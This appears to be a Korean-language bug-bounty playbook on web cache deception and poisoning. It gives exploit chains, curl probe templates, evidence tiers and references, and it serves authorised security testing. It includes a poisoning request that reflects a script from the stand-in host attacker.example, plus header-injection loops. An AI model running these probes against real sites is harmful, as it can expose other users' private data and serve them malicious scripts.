# Scenario: Web Cache Deception / Poisoning

> CDN/reverse proxy와 origin의 URL 해석 차이를 이용한 pathological cache.

## 1. Threat Model
- **타겟**: Cloudflare, Akamai, Fastly, Varnish, CloudFront 뒤에 있는 앱
- **공격자**: unauthenticated, victim 1명이 URL 클릭 필요 (deception) 또는 자체 trigger (poisoning)
- **Impact**: Deception = 타 사용자 개인 정보 캐시 저장 후 공격자 조회 / Poisoning = 전체 사용자에게 악성 응답 제공
- **Severity**: Medium–High (impact scope에 따라)

## 2. Discovery Signals
- CDN 앞단 (X-Cache, CF-Cache-Status, Age 헤더)
- Origin이 `*.css`, `*.js`, `*.png` 확장자 요청에도 동적 컨텐츠 반환
- Query string 기반 cache key vs header 기반 변동
- `Vary` 헤더 누락/불충분

## 3. Exploit Chain

### 3.1 Cache deception (Omer Gil 2017 계보)
```
Victim URL: https://app.example/profile → 동적 개인 정보 반환
공격자 링크: https://app.example/profile/fake.css
→ CDN은 fake.css를 static으로 판단 → cache
→ origin은 profile을 반환 (path traversal-like)
→ CDN에 victim의 profile 응답이 cached under fake.css
공격자가 fake.css URL 직접 방문 → victim 데이터 획득
```

### 3.2 Cache poisoning (Kettle 2018 연구)
```
요청:
GET /en?cb=1 HTTP/1.1
Host: app.example
X-Forwarded-Host: attacker.example

응답에 X-Forwarded-Host가 반영됨 (`<script src="//attacker.example/...">`)
CDN이 이를 cache → 이후 모든 사용자에게 악성 응답
```

### 3.3 HTTP/2 cache poisoning
```
HTTP/2 request smuggling + cache = CDN이 split된 요청의 뒷부분을 분리된 URL로 cache
```

### 3.4 Parameter cloaking
```
CDN: cache key = path only
Origin: path?utm_source=foo 가 utm을 무시하고 동일 응답
→ ?utm_source=<attack> 로 cache key 다르게 보여주지만 응답은 동일
```

## 4. PoC Template
```bash
# Deception probe
curl -H "Cookie: session=victim_session" \
  https://app.example/profile/aaa.css \
  -o victim_resp.html
# cached 여부 확인
curl -I https://app.example/profile/aaa.css \
  | grep -iE "(cf-cache-status|x-cache|age)"

# Poisoning probe (via unkeyed header)
for h in X-Forwarded-Host X-Host X-Original-URL X-Rewrite-URL; do
  curl -s -H "$h: poison.example" "https://app.example/?cb=$RANDOM" -I \
       | grep -iE "(poison.example|location:)"
done

# Param cloaking
curl -I "https://app.example/?utm_source=anything&real_param=..."
```

## 5. Evidence Tier
- E1: victim 데이터가 공격자 URL에서 조회되는 스크린샷 + CDN cache 히트 증명
- E2: unkeyed header가 응답에 반영됨 증명 (poison)
- E3: cache key 분석만

## 6. Gate 1 / Gate 2
- [ ] CDN 설정이 프로그램 scope인가 (CDN 자체 vs 앱 설정 문제)
- [ ] 실제 victim 쿠키/데이터 유출 증명 — 추측 금지
- [ ] CDN이 즉시 TTL이라면 impact 낮음

## 7. Variants
- **Static extension list 확장**: .js, .jpg, .png, .woff, .svg
- **Path parameter abuse**: `/en;.css`
- **HPP (HTTP Parameter Pollution)** 와 결합
- **ESI injection** (Edge Side Includes) — 일부 CDN
- **Cache key confusion** via normalization difference

## 8. References
- Omer Gil — "Web Cache Deception Attack" (2017)
- James Kettle (PortSwigger) — "Practical Web Cache Poisoning" (2018, 2019, 2020)
- PortSwigger Academy — Web cache deception / poisoning 섹션
- HackerOne: GitHub, Shopify, HackMD 공개 disclosure
